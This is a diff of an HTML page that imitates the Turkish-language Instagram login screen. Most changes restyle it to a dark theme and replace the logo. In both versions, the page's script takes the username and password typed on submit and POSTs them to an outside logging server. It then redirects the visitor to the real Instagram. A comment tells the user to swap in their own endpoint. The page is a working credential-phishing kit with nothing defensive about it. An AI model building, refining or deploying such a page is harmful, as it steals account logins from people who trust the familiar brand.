@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Instagram  Giriş Yap</title>
+    <title>Instagram Giriş Yap</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
         }
         
         body {
-            background-color: #fafafa;
+            background-color: #000000;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -31,8 +31,8 @@
         }
         
         .login-box {
-            background-color: white;
-            border: 1px solid #dbdbdb;
+            background-color: rgb(0, 0, 0);
+            border: 1px solid #474747;
             border-radius: 1px;
             padding: 20px;
             margin-bottom: 10px;
@@ -42,13 +42,14 @@
             align-items: center;
         }
         
- .logo {
-    font-family: 'Great Vibes', cursive;
-    font-size: 100px;
-    font-weight: 400; /* Çok etkili olmayabilir ama yine de ekle */
-    color: #444;
-}
+        .logo {
+            margin-bottom: 20px; /* Resim ile form arasında boşluk */
+        }
 
+        .logo img {
+            width: 290px; /* Resim boyutu */
+            height: auto; /* Orantılı boyutlandırma */
+        }
 
         form {
             width: 100%;
@@ -60,8 +61,8 @@
         }
         
         input {
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
+            background-color: #2b2a2a;
+            border: 1px solid #272626;
             border-radius: 3px;
             color: #262626;
             font-size: 14px;
@@ -104,7 +105,7 @@
         .separator::after {
             content: "";
             flex: 1;
-            border-bottom: 1px solid #dbdbdb;
+            border-bottom: 1px solid #585858;
         }
         
         .separator span {
@@ -124,14 +125,8 @@
             cursor: pointer;
         }
         
-        .facebook-icon {
-            color: #385185;
-            font-weight: bold;
-            margin-right: 8px;
-        }
-        
         .forgot-password {
-            color: #00376b;
+            color: #ffffff;
             font-size: 12px;
             text-align: center;
             margin: 12px 0;
@@ -139,8 +134,8 @@
         }
         
         .signup-box {
-            background-color: white;
-            border: 1px solid #dbdbdb;
+            background-color: rgb(0, 0, 0);
+            border: 1px solid #525252;
             border-radius: 1px;
             padding: 20px;
             width: 100%;
@@ -149,6 +144,7 @@
         
         .signup-box p {
             font-size: 14px;
+             color: #ffffff;
         }
         
         .signup-link {
@@ -165,24 +161,6 @@
         .app-download p {
             font-size: 14px;
             margin-bottom: 20px;
-        }
-        
-        .app-links {
-            display: flex;
-            justify-content: center;
-        }
-        
-        .app-button {
-            background-color: black;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 8px 12px;
-            margin: 0 5px;
-            font-size: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
         }
         
         .footer {
@@ -220,7 +198,7 @@
             }
             
             body {
-                background-color: white;
+                background-color: rgb(0, 0, 0);
             }
         }
     </style>
@@ -228,11 +206,9 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <h1 class="logo">Instagram
-                <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
-
-
-            </h1>
+            <div class="logo">
+                <img src="insta logo.png" alt="insta logo.png"> <!-- Yerel resim dosyası -->
+            </div>
             <form id="loginForm">
                 <div class="form-group">
                     <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" aria-label="Telefon numarası, kullanıcı adı veya e-posta" />
@@ -248,7 +224,6 @@
             </div>
             
             <div class="facebook-login">
-                <span class="facebook-icon">f</span>
                 Facebook ile Giriş Yap
             </div>
             
@@ -264,8 +239,7 @@
         <div class="app-download">
             <p>Uygulamayı indir.</p>
             <div class="app-links">
-                <button class="app-button">App Store'dan İndir</button>
-                <button class="app-button">Google Play'den İndir</button>
+               
             </div>
         </div>
     </div>
@@ -283,7 +257,7 @@
             <a href="#" class="footer-link">Dil</a>
             <a href="#" class="footer-link">Meta Verified</a>
         </div>
-        <div class="copyright">© 2025 Instgram</div>
+        <div class="copyright">© 2025 Instagram</div>
     </footer>
 
     <script>
@@ -299,19 +273,19 @@
             });
         });
 
-     form.addEventListener("submit", (e) => {
-    e.preventDefault();
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-    fetch("https://logserver-rmu0.onrender.com/log", {   <!-- BUNU BURADA DEĞİŞTİR -->
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username, password }),
-    }).then(() => {
-      window.location.href = "https://instagram.com";
-    });
-  });
+            fetch("https://logserver-rmu0.onrender.com/log", {   // Bunu burada değiştir
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password }),
+            }).then(() => {
+                window.location.href = "https://instagram.com";
+            });
+        });
     </script>
 </body>
 </html>
